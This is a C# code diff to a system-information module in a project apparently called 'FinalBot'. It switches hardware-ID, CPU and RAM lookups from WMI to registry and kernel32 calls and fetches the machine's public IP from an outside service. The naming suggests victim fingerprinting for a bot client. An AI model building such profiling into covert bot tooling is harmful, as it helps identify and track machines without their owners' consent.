@@ -1,13 +1,36 @@
 using System;
 using System.IO;
-using System.Management;
 using System.Net;
 using System.Text;
+using System.Runtime.InteropServices;
+using Microsoft.Win32;
 
 namespace FinalBot.Modules
 {
     public static class SystemInfoModule
     {
+        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Auto)]
+        private class MEMORYSTATUSEX
+        {
+            public uint dwLength;
+            public uint dwMemoryLoad;
+            public ulong ullTotalPhys;
+            public ulong ullAvailPhys;
+            public ulong ullTotalPageFile;
+            public ulong ullAvailPageFile;
+            public ulong ullTotalVirtual;
+            public ulong ullAvailVirtual;
+            public ulong ullAvailExtendedVirtual;
+            public MEMORYSTATUSEX()
+            {
+                this.dwLength = (uint)Marshal.SizeOf<MEMORYSTATUSEX>();
+            }
+        }
+
+        [return: MarshalAs(UnmanagedType.Bool)]
+        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
+        private static extern bool GlobalMemoryStatusEx([In, Out] MEMORYSTATUSEX lpBuffer);
+
         public static string GetSystemInfo()
         {
             var sb = new StringBuilder();
@@ -23,28 +46,33 @@ namespace FinalBot.Modules
             return sb.ToString();
         }
 
-        private static string GetHWID()
+        public static string GetHWID()
         {
             try 
             {
-                string m_Args = "";
-                ManagementObjectSearcher m_Searcher = new ManagementObjectSearcher("SELECT SerialNumber FROM Win32_BaseBoard");
-                foreach (ManagementObject m_Object in m_Searcher.Get())
+                using (var key = Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Microsoft\Cryptography"))
                 {
-                    m_Args = m_Object["SerialNumber"].ToString();
+                    if (key != null)
+                    {
+                        var val = key.GetValue("MachineGuid");
+                        if (val != null) return val.ToString();
+                    }
                 }
-                return m_Args;
             }
-            catch { return "Unknown"; }
+            catch { }
+            return "Unknown";
         }
 
-        private static string GetExternalIP()
+        public static string GetExternalIP()
         {
             try 
             {
-                using (var client = new WebClient())
+                using (var client = new System.Net.Http.HttpClient())
                 {
-                    return client.DownloadString("https://api.ipify.org");
+                    client.Timeout = TimeSpan.FromSeconds(5);
+                    var task = client.GetStringAsync("https://api.ipify.org");
+                    if (task.Wait(5000)) return task.Result;
+                    return "Timeout";
                 }
             }
             catch { return "Unknown"; }
@@ -54,10 +82,13 @@ namespace FinalBot.Modules
         {
             try 
             {
-                ManagementObjectSearcher searcher = new ManagementObjectSearcher("SELECT Name FROM Win32_Processor");
-                foreach (ManagementObject obj in searcher.Get())
+                using (var key = Registry.LocalMachine.OpenSubKey(@"HARDWARE\DESCRIPTION\System\CentralProcessor\0"))
                 {
-                    return obj["Name"].ToString();
+                    if (key != null)
+                    {
+                        var val = key.GetValue("ProcessorNameString");
+                        if (val != null) return val.ToString().Trim();
+                    }
                 }
             }
             catch { }
@@ -68,11 +99,10 @@ namespace FinalBot.Modules
         {
             try 
             {
-                ManagementObjectSearcher searcher = new ManagementObjectSearcher("SELECT TotalPhysicalMemory FROM Win32_ComputerSystem");
-                foreach (ManagementObject obj in searcher.Get())
+                MEMORYSTATUSEX memStatus = new MEMORYSTATUSEX();
+                if (GlobalMemoryStatusEx(memStatus))
                 {
-                    long bytes = Convert.ToInt64(obj["TotalPhysicalMemory"]);
-                    return (bytes / 1024 / 1024 / 1024).ToString();
+                    return (memStatus.ullTotalPhys / 1024 / 1024 / 1024).ToString();
                 }
             }
             catch { }
